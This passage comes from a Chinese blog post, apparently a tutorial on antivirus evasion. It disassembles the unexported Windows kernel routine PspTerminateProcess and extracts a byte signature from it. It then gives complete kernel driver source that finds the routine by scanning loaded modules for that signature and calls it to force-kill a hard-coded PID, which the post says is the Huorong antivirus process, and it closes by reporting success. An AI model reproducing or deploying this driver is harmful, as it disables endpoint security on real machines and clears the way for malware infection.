<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">805d3487 56 				push esi </span><br><span class="line">805d3488 64a124010000 		mov eax,dword ptr fs:[00000124h] </span><br><span class="line">805d348e 8b7508 			mov esi,dword ptr [ebp+8]</span><br><span class="line">805d3491 3b7044 			cmp esi,dword ptr [eax+44h]</span><br><span class="line">805d3494 7507 				jne nt!PspTerminateProcess+0x1b (805d349d)</span><br><span class="line">805d3496 b80d0000c0 		mov eax,0C000000Dh </span><br><span class="line">805d349b eb5a 				jmp nt!PspTerminateProcess+0x75 (805d34f7) </span><br><span class="line">805d349d 57 				push edi</span><br></pre></td></tr></table></figure>

<p>提取出的相应特征码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UCHAR szSpecialCode[] = &#123;0x56, 0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, 0x8B, 0x75, 0x08, 0x3B, 0x70, 0x44, 0x75, 0x07, 0xB8, 0x0D, 0x00, 0x00, 0xC0, 0xEB, 0x5A, 0x57 &#125;;</span><br></pre></td></tr></table></figure>

<h2 id="3-3代码实现"><a href="#3-3代码实现" class="headerlink" title="3.3代码实现"></a>3.3代码实现</h2><p>如图所示火绒的PID为2976</p>
<p><img src="/images/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E5%BC%BA%E6%9D%80/image-20231001214601700.png" alt="image-20231001214601700"></p>
<p>具体代码实现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;ntifs.h&gt; </span><br><span class="line">typedef struct _LDR_DATA_TABLE_ENTRY &#123;</span><br><span class="line">	LIST_ENTRY InLoadOrderLinks; </span><br><span class="line">	LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">	LIST_ENTRY InInitializationOrderLinks; </span><br><span class="line">	PVOID DllBase; </span><br><span class="line">	PVOID EntryPoint; </span><br><span class="line">	UINT32 SizeOfImage;</span><br><span class="line">	UNICODE_STRING FullDllName; </span><br><span class="line">	UNICODE_STRING BaseDllName; </span><br><span class="line">	UINT32 Flags; </span><br><span class="line">	UINT16 LoadCount; </span><br><span class="line">	UINT16 TlsIndex; </span><br><span class="line">	LIST_ENTRY HashLinks; </span><br><span class="line">	PVOID SectionPointer; </span><br><span class="line">	UINT32 CheckSum; </span><br><span class="line">	UINT32 TimeDateStamp;</span><br><span class="line">	PVOID LoadedImports;</span><br><span class="line">	PVOID EntryPointActivationContext; </span><br><span class="line">	PVOID PatchInformation; </span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;</span><br><span class="line">typedef NTSTATUS(*pfnPspTerminateProcess)(PEPROCESS pEprocess, NTSTATUS ExitCode);</span><br><span class="line">VOID DriverUnload(IN PDRIVER_OBJECT driverObject); //卸载驱动 </span><br><span class="line">PVOID SearchFunction(PUCHAR DllBase, UINT32 SizeOfImage); // 查找模块中匹配特征码 </span><br><span class="line">ULONG g_uPID = 2976; // 要关闭的进程PID</span><br><span class="line">// 特征码 </span><br><span class="line">UCHAR g_szSpecialCode[] = &#123; 0x56, 0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, </span><br><span class="line">0x8B, 0x75, 0x08, 0x3B, 0x70, 0x44, 0x75, 0x07,</span><br><span class="line">0xB8, 0x0D, 0x00, 0x00, 0xC0, 0xEB, 0x5A, 0x57 &#125;; </span><br><span class="line">// 特征码长度 </span><br><span class="line">UINT32 g_uSpecialCodeLen = sizeof(g_szSpecialCode);</span><br><span class="line">NTSTATUS DriverEntry(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING registryPath) &#123;</span><br><span class="line">	NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY pLdrDataTableEntry = NULL;</span><br><span class="line">	pfnPspTerminateProcess pPspTerminateProcess = NULL;</span><br><span class="line">	PEPROCESS pEprocess = NULL;</span><br><span class="line">	DbgPrint(&quot;驱动加载完成\r\n&quot;);</span><br><span class="line">	pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)driverObject-&gt;DriverSection;</span><br><span class="line">	pLdrDataTableEntry = CONTAINING_RECORD(pLdrDataTableEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);</span><br><span class="line">	pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pLdrDataTableEntry-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">	do &#123;</span><br><span class="line">		pLdrDataTableEntry = CONTAINING_RECORD(pLdrDataTableEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);</span><br><span class="line">		// 如果存在则搜索特征码</span><br><span class="line">		if (pLdrDataTableEntry-&gt;DllBase) &#123;</span><br><span class="line">			pPspTerminateProcess = (pfnPspTerminateProcess)SearchFunction((PUCHAR)pLdrDataTableEntry-&gt;DllBase, pLdrDataTableEntry-&gt;SizeOfImage);</span><br><span class="line">		&#125;</span><br><span class="line">		if (pPspTerminateProcess) break;</span><br><span class="line">		// 遍历 </span><br><span class="line">		pLdrDataTableEntry = (PLDR_DATA_TABLE_ENTRY)pLdrDataTableEntry-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">	&#125; while ((UINT32)pLdrDataTableEntry != (UINT32)driverObject-&gt;DriverSection);</span><br><span class="line">	if (pPspTerminateProcess) &#123;</span><br><span class="line">		status = PsLookupProcessByProcessId((HANDLE)g_uPID, &amp;pEprocess);</span><br><span class="line">		if (NT_SUCCESS(status)) &#123;</span><br><span class="line">			status = pPspTerminateProcess(pEprocess, 0);</span><br><span class="line">			if (NT_SUCCESS(status)) &#123;</span><br><span class="line">				DbgPrint(&quot;使用PspTerminateProcess 关闭进程成功, PID = %d\r\n&quot;, g_uPID);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			DbgPrint(&quot;PsLookupProcessByProcessId Error 0x%X\r\n&quot;, status);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	driverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	return STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line">VOID DriverUnload(IN PDRIVER_OBJECT driverObject) &#123;</span><br><span class="line">	DbgPrint(&quot;驱动卸载完成\r\n&quot;);</span><br><span class="line">&#125;PVOID SearchFunction(PUCHAR DllBase, UINT32 SizeOfImage) &#123; </span><br><span class="line">	DbgPrint(&quot;Here is MemorySearch , length is : %d\r\n&quot;, SizeOfImage); </span><br><span class="line">	PVOID pFuncAddr = NULL;</span><br><span class="line">	UINT32 uEnd = (UINT32)DllBase + SizeOfImage - g_uSpecialCodeLen; </span><br><span class="line">	// 减去特 征码后的长度 </span><br><span class="line">	UINT32 i = 0; BOOLEAN bOk = TRUE; </span><br><span class="line">	while ((UINT32)DllBase &lt;= uEnd) &#123;</span><br><span class="line">		bOk = TRUE; for (i = 0; i &lt; g_uSpecialCodeLen; i++) &#123; </span><br><span class="line">			if (!MmIsAddressValid(&amp;DllBase[i]) || DllBase[i] != g_szSpecialCode[i]) &#123; </span><br><span class="line">				bOk = FALSE; break; </span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		if (bOk) &#123;</span><br><span class="line">			pFuncAddr = (PVOID)(DllBase - 5); </span><br><span class="line">			DbgPrint(&quot;找到特征码，内存地址为%p\r\n&quot;, pFuncAddr);</span><br><span class="line">			break; </span><br><span class="line">		&#125;</span><br><span class="line">		DllBase++; </span><br><span class="line">	&#125;</span><br><span class="line">	return pFuncAddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E5%BC%BA%E6%9D%80/image-20231001214744837.png" alt="image-20231001214744837"></p>
<p>代码执行成功！！！</p>
]]></content>
      <categories>
        <category>免杀基础</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
</search>
